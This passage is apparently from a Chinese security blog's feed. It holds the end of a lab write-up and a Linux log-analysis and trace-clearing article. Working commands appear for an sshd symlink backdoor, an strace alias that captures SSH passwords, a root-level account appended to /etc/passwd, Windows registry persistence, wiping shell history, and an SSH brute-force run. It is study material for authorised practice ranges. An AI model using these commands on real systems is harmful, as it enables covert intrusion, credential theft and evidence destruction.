成功反弹</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221165559108.png" alt="image-20240221165559108"></p><p>   直接就是system</p><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><ol><li><p>针对 ubuntu </p><ul><li><p>使用ssh 软连接方式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sf <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/sshd /</span>tmp<span class="hljs-regexp">/su;/</span>tmp/su -oport=<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure></li><li><p>生成公钥</p></li><li><p>起别名</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">alias ssh=&#x27;strace -o /tmp/sshpwd-`date +<span class="hljs-built_in">%d</span><span class="hljs-built_in">%h</span><span class="hljs-built_in">%m</span><span class="hljs-built_in">%s</span>`.log -e <span class="hljs-keyword">read</span>,<span class="hljs-keyword">write</span>,connect -s2048 ssh&#x27;<br></code></pre></td></tr></table></figure></li><li><p>创建后门账号</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lsl">perl -e &#x27;print crypt(<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-string">&quot;adgfagm&quot;</span>).<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>&#x27;<br>echo <span class="hljs-string">&quot;weblogic1:adCP9<span class="hljs-subst">\\</span>qaScc2:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221171054574.png" alt="image-20240221171054574"></p></li></ul></li><li><p>win7</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot;</span> /v GlobalFlag /t REG_DWORD /d 512 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v ReportingMode /t REG_DWORD /d 1 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v MonitorProcess /t REG_SZ /d <span class="hljs-string">&quot;C:\Windows\system32\calc.exe&quot;</span> /f</span><br><br><span class="hljs-comment"># 可以更改C:\Windows\system32\calc.exe为payload，如powershell命令</span><br></code></pre></td></tr></table></figure></li><li><p>域控，处内内网，但是已经写了定时任务</p></li></ol><h1 id="痕迹清楚"><a href="#痕迹清楚" class="headerlink" title="痕迹清楚"></a>痕迹清楚</h1><ol><li><p>ubuntu </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">history</span> –w &amp;&amp; <span class="hljs-keyword">history</span> –c &amp;&amp; &gt; <span class="hljs-string">.bash_history</span><br></code></pre></td></tr></table></figure></li><li><p>win7</p><p>直接使用msf</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> event_manager -c<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221172419610.png" alt="image-20240221172419610"></p></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="web-渗透阶段"><a href="#web-渗透阶段" class="headerlink" title="web 渗透阶段"></a>web 渗透阶段</h2><ol><li><p>通过发现的三个端口进行渗透</p><p>很巧的是，每一个端口都有漏洞，</p><ul><li><p>2001</p><p>这个是一个很典型的s2 漏洞，通过对网站抓包发现了是s2 框架开发的</p><p>通过反弹shell ，反弹到攻击机</p><p>注意编码的时候，可能得换一下</p></li><li><p>2002</p><p>这个是tomcat 的是可以使用put 的形式http 方式上传webshell 然后连接webshell 管理器</p></li><li><p>2003</p><p>这个phpmyadmin 都没有密码，所以就直接访问到了后台，本来想通过写慢日志的方式反弹shell 但是没有对应的权限<br>但是有一个ssrf 可以访问主机上的文件</p><p>我们可以通过mysql 写一句话木马到文件，通过session 访问到具体的文件，从而加载webshell 但是没有成功</p></li></ul></li><li><p>得到webshell </p><p>发现是docker ，通过挂载宿主机的目录，然后写定时任务进行反弹shell</p><p>从而得到了宿主机的shell</p><p>这个时候我选择上传msf payload</p></li></ol><h2 id="内网信息收集-1"><a href="#内网信息收集-1" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><ol><li><p>通过内网网段的扫描发现了win7 winserver </p><p>并且通过fscan 扫描到了ms17_010</p><p>但是利用msf 攻击一直失败</p><p>需要很多次才能成功</p></li><li><p>其他端口我就没有测试了</p></li></ol><h2 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动"></a>横向移动</h2><ol><li><p>win7</p><p>使用msf ms17_010模块</p><p>尝试很多次</p></li><li><p>winserver </p><p>也就是域控主机，这个我们需要制作黄金票据</p><p>通过ms14，然后通过这个使用IPC 的方式进行文件传输</p><p>再使用schtasks 的方式反弹metepreter 但是注意需要添加代理，并且payload 必须是bind</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cs上线linux</title>
    <link href="/2024/02/19/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/"/>
    <url>/2024/02/19/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/</url>
    
    <content type="html"><![CDATA[<h1 id="cs-上线linux"><a href="#cs-上线linux" class="headerlink" title="cs 上线linux"></a>cs 上线linux</h1><h2 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/image-20240219121756131.png" alt="image-20240219121756131"></p><h2 id="使用C2-创建监听器"><a href="#使用C2-创建监听器" class="headerlink" title="使用C2 创建监听器"></a>使用C2 创建监听器</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/image-20240219122025487.png" alt="image-20240219122025487"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/image-20240219122153244.png" alt="image-20240219122153244"></p><h2 id="pyload"><a href="#pyload" class="headerlink" title="pyload"></a>pyload</h2><p>在对应的client 下面生成的payload </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/image-20240219122356894.png" alt="image-20240219122356894"></p><h2 id="模拟上线"><a href="#模拟上线" class="headerlink" title="模拟上线"></a>模拟上线</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/image-20240219122600145.png" alt="image-20240219122600145"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/cs%E4%B8%8A%E7%BA%BFlinux/image-20240219122626209.png" alt="image-20240219122626209"></p>]]></content>
    
    
    
    <tags>
      
      <tag>整理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nisp</title>
    <link href="/2024/02/19/%E8%80%83%E8%AF%81/nisp1/"/>
    <url>/2024/02/19/%E8%80%83%E8%AF%81/nisp1/</url>
    
    <content type="html"><![CDATA[<h1 id="错题记录"><a href="#错题记录" class="headerlink" title="错题记录"></a>错题记录</h1><ol><li><p>一个企业注重于数据完整性，建议使用哪种控制协议</p><blockquote><p>Biba 模型</p></blockquote></li></ol><h1 id="知识点记录"><a href="#知识点记录" class="headerlink" title="知识点记录"></a>知识点记录</h1><ol><li><p>对称加密算法的优点是</p><blockquote><p>算法简单，计算量小，加密速度快，加密效率高，适合加密大量数据，明文长度与密文长度相等</p></blockquote></li><li><p>用支付宝买东西的时候</p><p>运用了  实体所知，实体特征</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>考证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux痕迹清除</title>
    <link href="/2024/02/18/%E6%B8%97%E9%80%8F/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/"/>
    <url>/2024/02/18/%E6%B8%97%E9%80%8F/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技  巧。  </p><p>日志对于系统的安全来说非常重要，它记录了系统每天发生的各种各样的事情，用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。日志主要的功能是审计和监测。它还可以实时地监测系统状态，监测和追踪侵入者。</p><blockquote><p> 日志默认存放位置：&#x2F;var&#x2F;log&#x2F;  </p><p> 查看日志配置情况：more  &#x2F;etc&#x2F;rsyslog.conf  </p></blockquote><p>日志消息级别  </p><blockquote><p>0 EMERG（紧急）：会导致主机系统不可用的情况  </p><p>1 ALERT（警告）：必须马上采取措施解决的问题  </p><p>2 CRIT（严重）：比较严重的情况  </p><p>3 ERR（错误）：运行出现错误  </p><p>4 WARNING（提醒）：可能会影响系统功能的事件  </p><p>5 NOTICE（注意）：不会影响系统但值得注意  </p><p>6 INFO（信息）：一般信息  </p><p>7 DEBUG（调试）：程序或系统调试信息等</p></blockquote><h1 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218223343224.png" alt="image-20240218223343224"></p><blockquote><p>登录失败记录：&#x2F;var&#x2F;log&#x2F;btmp  #lastb  </p><p>最后一次登录：&#x2F;var&#x2F;log&#x2F;lastlog  <em>#lastlog</em>  </p><p>登录成功记录: &#x2F;var&#x2F;log&#x2F;wtmp  登录日志记录：&#x2F;var&#x2F;log&#x2F;secure  #last  </p><p>目前登录用户信息：&#x2F;var&#x2F;run&#x2F;utmp  #w、<em>who</em>、<em>users</em>  历史命令记录：history  </p><p>仅清理当前用户：history -c</p></blockquote><h1 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h1><ul><li><p>who</p><p>who 命令显示关于当前在本地系统上的所有用户的信息。  </p><p>可以显示现在登录得信息和之前登录得信息</p></li><li><p>w</p><p>w 显示目前登入系统的用户信息。  </p></li><li><p>last  </p><p>last命令列出目前与过去登入系统的用户相关信息。  </p></li><li><p>lastlog  </p><p>lastlog 报告所有用户的最近登录情况，或者指定用户的最近登录情况</p></li></ul><blockquote><p>tty：终端设备的统称。  </p><p>tty一词源于Teletypes，或者teletypewriters，原来指的是电传打字机，是通过串行线用打印机键盘通过阅读和发送信息的东西，后来这东西被键盘与显示器取  代，所以现在叫终端比较合适。终端是一种字符型设备，它有多种类型，通常使用tty来简称各种类型的终端设备。  </p><p>tty1～6是文本型控制台，tty7是X Window图形显示管理器。在本地机器上可以通过Ctrl+Alt+F1（F1-F7键）切换到对应的登录控制台。</p></blockquote><blockquote><p>pty（虚拟终端)：  </p><p>但是假如我们远程telnet到主机或使用xterm时不也需要一个终端交互么？是的，这就是虚拟终端pty(pseudo-tty)  pts&#x2F;ptmx（pts&#x2F;ptmx结合使用，进而实现pty）：  </p><p>pts(pseudo-terminal slave)是pty的实现方法，和ptmx(pseudo-terminal master)配合使用实现pty。  </p></blockquote><h1 id="日志分析技巧"><a href="#日志分析技巧" class="headerlink" title="日志分析技巧"></a>日志分析技巧</h1><h2 id="常用的shell命令"><a href="#常用的shell命令" class="headerlink" title="常用的shell命令"></a>常用的shell命令</h2><blockquote><p>  ﬁnd、grep 、egrep、awk、sed  </p></blockquote><ul><li>grep 显示前后几行信息</li></ul>  <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">grep -C <span class="hljs-number">5</span> <span class="hljs-literal">admin</span> <span class="hljs-keyword">file</span> <span class="hljs-comment">#显示file文件里匹配admin字串那行以及上下5行</span><br>grep -B <span class="hljs-number">5</span> <span class="hljs-literal">admin</span> <span class="hljs-keyword">file</span> <span class="hljs-comment">#显示admin及前5行</span><br>grep -A <span class="hljs-number">5</span> <span class="hljs-literal">admin</span> <span class="hljs-keyword">file</span> <span class="hljs-comment">#显示admin及后5行</span><br></code></pre></td></tr></table></figure><ul><li>grep 查找含有某字符串的所有文件</li></ul>  <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs diff">grep -rn &quot;hello,world!&quot; *<br>*: 表示当前目录所有文件，也可以是某个文件名<br><span class="hljs-deletion">-r 是递归查找</span><br><span class="hljs-deletion">-n 是显示行号</span><br><span class="hljs-deletion">-R 查找所有文件包含子目录</span><br><span class="hljs-deletion">-i 忽略大小写</span><br></code></pre></td></tr></table></figure><ul><li>显示一个文件的某几行</li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#从第1000行开始，显示2000行。即显示1000~2999行</span><br><span class="hljs-built_in">cat</span> input_file | <span class="hljs-built_in">tail</span> -n +1000 | <span class="hljs-built_in">head</span> -n 2000<br></code></pre></td></tr></table></figure><ul><li>ﬁnd 查找文件</li></ul>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#在/etc目录中查找文件init</span><br><span class="hljs-built_in">find</span> /etc -name init<br></code></pre></td></tr></table></figure><ul><li>awk</li></ul>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#只是显示<span class="hljs-regexp">/etc/</span>passwd的账户<br>cat <span class="hljs-regexp">/etc/</span>passwd |awk -F <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span><br>#awk -F指定域分隔符为<span class="hljs-string">&#x27;:&#x27;</span>，将记录按指定的域分隔符划分域，填充域，$<span class="hljs-number">0</span>则表示所有域, $<span class="hljs-number">1</span>表示第一个域, $n表示第n个域。<br><br></code></pre></td></tr></table></figure><ul><li>sed</li></ul>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#删除历史操作记录，只保留前153行</span><br><span class="hljs-attribute">sed</span> -i <span class="hljs-string">&#x27;153,<span class="hljs-variable">$d</span>&#x27;</span> .bash_history<br><br></code></pre></td></tr></table></figure><h2 id="secure日志"><a href="#secure日志" class="headerlink" title="secure日志"></a>secure日志</h2><blockquote><p>centos   &#x2F;var&#x2F;log&#x2F;secure </p><p>ubuntu &#x2F;var&#x2F;log&#x2F;auth.log</p></blockquote><blockquote><p>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改户密码都会记录在这个日  志文件中。  </p></blockquote><ol><li><p>定位有哪些IP在爆破</p><blockquote><p>  <em>#</em> 模拟爆破  </p><p>  hydra -l  root -P rockyou.txt 192.168.81.147 ssh  </p></blockquote><blockquote><p>grep “Failed password” &#x2F;var&#x2F;log&#x2F;secure | awk ‘{print $11}’ | sort | uniq -c</p><p>grep “Failed password” &#x2F;var&#x2F;log&#x2F;secure | grep -E -o “(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)” | uniq -c</p><p>grep “Failed password” &#x2F;var&#x2F;log&#x2F;secure | egrep -o “(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)” | uniq -c</p><p>grep -E：使用扩展正则表达式<br>grep -o：只输出文件中匹配到的部分</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218230456597.png" alt="image-20240218230456597"></p><p>还好vps 没有被爆破</p></li><li><p>定位哪些IP在爆破主机的root帐号</p></li></ol>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr<br>awk：文本和数据进行处理的编程语言。<br><span class="hljs-built_in">sort</span>：对文本文件中所有行进行排序。<br><span class="hljs-built_in">sort</span> -nr：依照数值的大小排序；以相反的顺序来排序<br><span class="hljs-built_in">uniq</span>：显示或忽略重复的行。<br><span class="hljs-built_in">uniq</span> -c：在每行开头增加重复次数<br><br></code></pre></td></tr></table></figure><ol start="3"><li><p>定位哪些IP在使用不存在的用户爆破，爆破的用户名是</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Failed password for invalid user&quot;</span> <span class="hljs-regexp">/var/</span>log/secure | awk <span class="hljs-string">&#x27;&#123;print $0&#125;&#x27;</span><br><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Failed password for invalid user&quot;</span> <span class="hljs-regexp">/var/</span>log/secure | awk <span class="hljs-string">&#x27;&#123;print $11,$13&#125;&#x27;</span> | uniq -c<br></code></pre></td></tr></table></figure></li><li><p>获取爆破用户名字典</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Failed password&quot;</span> <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/secure | perl -e &#x27;while($_=&lt;&gt;)&#123; /</span><span class="hljs-keyword">for</span>(.*?) <span class="hljs-keyword">from</span>/; <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$1\n&quot;</span>;&#125;<span class="hljs-string">&#x27; | uniq -c | sort -rn</span><br></code></pre></td></tr></table></figure></li><li><p>登录成功的IP有哪些</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Accepted &quot;</span> <span class="hljs-regexp">/var/</span>log/secure | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr | more<br></code></pre></td></tr></table></figure></li><li><p>登录成功的日期、用户名、IP</p></li></ol>   <figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">grep <span class="hljs-string">&quot;Accepted &quot;</span> /<span class="hljs-keyword">var</span>/log/secure | awk <span class="hljs-string">&#x27;&#123;print <span class="hljs-subst">$1</span>,<span class="hljs-subst">$2</span>,<span class="hljs-subst">$3</span>,<span class="hljs-subst">$9</span>,<span class="hljs-subst">$11</span>&#125;&#x27;</span><br></code></pre></td></tr></table></figure><ol start="7"><li>增加一个用户kali日志</li></ol>   <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 添加用户</span><br><span class="hljs-attribute">useradd</span> kali<br>passwd kali<br></code></pre></td></tr></table></figure><p>   然后过滤创建得用户</p>   <figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs inform7">grep <span class="hljs-string">&quot;Failed password&quot;</span> /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c<br><br>grep <span class="hljs-string">&quot;Failed password&quot;</span> /var/log/secure | grep -E -o <span class="hljs-string">&quot;(25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span><span class="hljs-subst">[0-9]</span>|<span class="hljs-subst">[01]</span>?<span class="hljs-subst">[0-9]</span><span class="hljs-subst">[0-9]</span>?)\.(25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span><span class="hljs-subst">[0-9]</span>|<span class="hljs-subst">[01]</span>?<span class="hljs-subst">[0-9]</span><span class="hljs-subst">[0-9]</span>?)\.(25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span><span class="hljs-subst">[0-9]</span>|<span class="hljs-subst">[01]</span>?<span class="hljs-subst">[0-9]</span><span class="hljs-subst">[0-9]</span>?)\.(25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span><span class="hljs-subst">[0-9]</span>|<span class="hljs-subst">[01]</span>?<span class="hljs-subst">[0-9]</span><span class="hljs-subst">[0-9]</span>?)&quot;</span> | uniq -c<br><br>grep <span class="hljs-string">&quot;Failed password&quot;</span> /var/log/secure | egrep -o <span class="hljs-string">&quot;(25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span><span class="hljs-subst">[0-9]</span>|<span class="hljs-subst">[01]</span>?<span class="hljs-subst">[0-9]</span><span class="hljs-subst">[0-9]</span>?)\.(25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span><span class="hljs-subst">[0-9]</span>|<span class="hljs-subst">[01]</span>?<span class="hljs-subst">[0-9]</span><span class="hljs-subst">[0-9]</span>?)\.(25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span><span class="hljs-subst">[0-9]</span>|<span class="hljs-subst">[01]</span>?<span class="hljs-subst">[0-9]</span><span class="hljs-subst">[0-9]</span>?)\.(25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span><span class="hljs-subst">[0-9]</span>|<span class="hljs-subst">[01]</span>?<span class="hljs-subst">[0-9]</span><span class="hljs-subst">[0-9]</span>?)&quot;</span> | uniq -c<br><br>grep -E：使用扩展正则表达式<br>grep -o：只输出文件中匹配到的部分<br></code></pre></td></tr></table></figure><ol start="8"><li><p>删除用户kali日志</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 删除用户</span><br><span class="hljs-attribute">userdel</span> kali<br><br><span class="hljs-comment"># grep &quot;userdel&quot; /var/log/secure</span><br><br><span class="hljs-attribute">Jul</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span>:<span class="hljs-number">14</span>:<span class="hljs-number">17</span> localhost userdel[<span class="hljs-number">2393</span>]: delete user &#x27;kali&#x27;<br><span class="hljs-attribute">Jul</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span>:<span class="hljs-number">14</span>:<span class="hljs-number">17</span> localhost userdel[<span class="hljs-number">2393</span>]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;<br><span class="hljs-attribute">Jul</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span>:<span class="hljs-number">14</span>:<span class="hljs-number">17</span> localhost userdel[<span class="hljs-number">2393</span>]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;<br></code></pre></td></tr></table></figure></li><li><p>su 切换用户</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata"># <span class="hljs-keyword">su</span> <span class="hljs-keyword">test</span><br><br># grep <span class="hljs-string">&quot;su:session&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure<br><br>Oct 13 08:00:29 localhost <span class="hljs-keyword">su</span>: pam_unix(<span class="hljs-keyword">su</span>:session): session opened <span class="hljs-keyword">for</span> user <span class="hljs-keyword">test</span> <span class="hljs-keyword">by</span> root(uid=0)<br>Oct 13 08:00:33 localhost <span class="hljs-keyword">su</span>: pam_unix(<span class="hljs-keyword">su</span>:session): session closed <span class="hljs-keyword">for</span> user <span class="hljs-keyword">test</span><br></code></pre></td></tr></table></figure></li><li><p>sudo 授权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># sudo -l</span><br><br><span class="hljs-comment"># grep &quot;sudo&quot; /var/log/secure</span><br><br>Oct 13 08:05:04 localhost sudo:    root : <span class="hljs-attribute">TTY</span>=pts/0 ; <span class="hljs-attribute">PWD</span>=/home ; <span class="hljs-attribute">USER</span>=root ; <span class="hljs-attribute">COMMAND</span>=list<br>Oct 13 08:06:07 localhost sudo:    root : <span class="hljs-attribute">TTY</span>=pts/0 ; <span class="hljs-attribute">PWD</span>=/home ; <span class="hljs-attribute">USER</span>=root ; <span class="hljs-attribute">COMMAND</span>=list<br></code></pre></td></tr></table></figure></li></ol><h2 id="登录日志"><a href="#登录日志" class="headerlink" title="登录日志"></a>登录日志</h2><p>ssh 产生得日志</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">命令        日志文件                 描述<br>last        <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/wtmp         所有成功登录/</span>登出的历史记录<br>lastb        <span class="hljs-regexp">/var/</span>log/btmp         登录失败尝试记录<br>lastlog        <span class="hljs-regexp">/var/</span>log/lastlog      最近登录记录<br>w,who       <span class="hljs-regexp">/var/</span>run/utmp         记录当前登录的每个用户的信息，它只保留当时连接的用户记录，不会为用户保留永久的记录<br></code></pre></td></tr></table></figure><p>命令的输出包括：登录名，上次登录时间，IP地址，端口等。  </p><p>登录日志清理：last等日志是二进制文件，无法直接修改。所以清除的最简单方式是清空日志文件本身。</p><h2 id="WEB日志"><a href="#WEB日志" class="headerlink" title="WEB日志"></a>WEB日志</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access.log<br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure><blockquote><p>  通过HTTP协议访问连接程序的WEB容器时，会记录对应的访问日志，因此需要清理容器的日志。如tomcat日志，IIS日志。  </p></blockquote><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access.log<br><span class="hljs-regexp">/var/</span>log<span 